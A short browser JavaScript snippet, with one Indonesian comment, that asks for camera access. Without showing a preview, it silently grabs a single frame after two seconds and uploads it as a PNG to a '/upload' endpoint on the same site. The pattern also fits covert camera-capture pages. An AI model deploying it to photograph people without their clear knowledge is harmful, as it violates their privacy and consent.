const canvas = document.getElementById("canvas");
const context = canvas.getContext("2d");

navigator.mediaDevices
  .getUserMedia({ video: true })
  .then((stream) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    video.onloadedmetadata = () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      setTimeout(() => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png");

        // Kirim gambar ke server
        fetch("/upload", {
          method: "POST",
          body: JSON.stringify({ image: imageData }),
          headers: {
            "Content-Type": "application/json",
          },
        })
          .then((response) => {
            if (response.ok) {
              console.log("Image sent successfully");
            } else {
              console.error("Failed to send image");
            }
          })
          .catch((err) => {
            console.error("Error:", err);
          });

        stream.getTracks().forEach((track) => track.stop());
      }, 2000);
    };
  })
  .catch((err) => {
    console.error("Error accessing camera:", err);
  });
